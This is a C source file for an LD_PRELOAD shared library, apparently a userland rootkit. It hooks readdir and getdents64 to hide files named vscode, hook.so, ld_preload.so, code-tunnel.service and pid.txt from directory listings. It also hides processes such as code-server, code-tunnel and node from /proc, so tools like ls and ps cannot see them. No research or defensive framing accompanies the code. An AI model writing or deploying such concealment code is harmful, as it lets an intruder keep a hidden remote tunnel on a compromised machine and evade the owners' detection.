// gcc -fPIC -shared -o hook.so vscode.c -ldl
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/stat.h>
struct linux_dirent64 {
    unsigned long long d_ino;
    long long          d_off;
    unsigned short     d_reclen;
    unsigned char      d_type;
    char               d_name[];
};
static const char *HIDE_FILES[] = {"vscode", ".vscode", "hook.so", "vscode.so", "pid.txt", "code-tunnel.service", "ld_preload.so"};
static const char *HIDE_PROCS[] = {"code-server", "vscode", "code-tunnel", "node", "code"};
static int is_proc_dir(int fd) {
    char path[256];
    char link[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    ssize_t len = readlink(path, link, sizeof(link)-1);
    if (len != -1) {
        link[len] = '\0';
        return (strcmp(link, "/proc") == 0);
    }
    return 0;
}
static int should_hide(const char *name, const char **list, size_t count) {
    if (!name) return 0;
    for (size_t i = 0; i < count; i++) {
        if (strstr(name, list[i]) != NULL) {
            return 1;
        }
    }
    return 0;
}
static int check_process_name(const char *pid_str) {
    char comm_path[256];
    snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", pid_str);
    
    int fd = open(comm_path, O_RDONLY);
    if (fd == -1) return 0;
    char proc_name[256];
    ssize_t n = read(fd, proc_name, sizeof(proc_name)-1);
    close(fd);
    if (n > 0) {
        proc_name[n] = '\0';
        char *nl = strchr(proc_name, '\n');
        if (nl) *nl = '\0';
        return should_hide(proc_name, HIDE_PROCS, sizeof(HIDE_PROCS)/sizeof(HIDE_PROCS[0]));
    }
    return 0;
}
// Hook readdir
typedef struct dirent *(*orig_readdir_f)(DIR *);
static orig_readdir_f real_readdir = NULL;
struct dirent *readdir(DIR *dir) {
    if (!real_readdir) real_readdir = (orig_readdir_f)dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    int fd = dirfd(dir);
    int is_proc = is_proc_dir(fd);
    while ((entry = real_readdir(dir)) != NULL) {
        if (should_hide(entry->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0]))) continue;
        if (is_proc && entry->d_type == DT_DIR && check_process_name(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}
// Hook getdents64 (This is what ps/ls usually uses)
typedef int (*orig_getdents64_f)(unsigned int, struct linux_dirent64 *, unsigned int);
static orig_getdents64_f real_getdents64 = NULL;
int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    if (!real_getdents64) real_getdents64 = (orig_getdents64_f)dlsym(RTLD_NEXT, "getdents64");
    
    int nread = real_getdents64(fd, dirp, count);
    if (nread <= 0) return nread;
    int is_proc = is_proc_dir(fd);
    int bpos = 0;
    while (bpos < nread) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dirp + bpos);
        int hide = 0;
        if (should_hide(d->d_name, HIDE_FILES, sizeof(HIDE_FILES)/sizeof(HIDE_FILES[0]))) {
            hide = 1;
        } else if (is_proc && d->d_type == DT_DIR && check_process_name(d->d_name)) {
            hide = 1;
        }
        if (hide) {
            int reclen = d->d_reclen;
            memmove(d, (char *)d + reclen, nread - bpos - reclen);
            nread -= reclen;
        } else {
            bpos += d->d_reclen;
        }
    }
    return nread;
}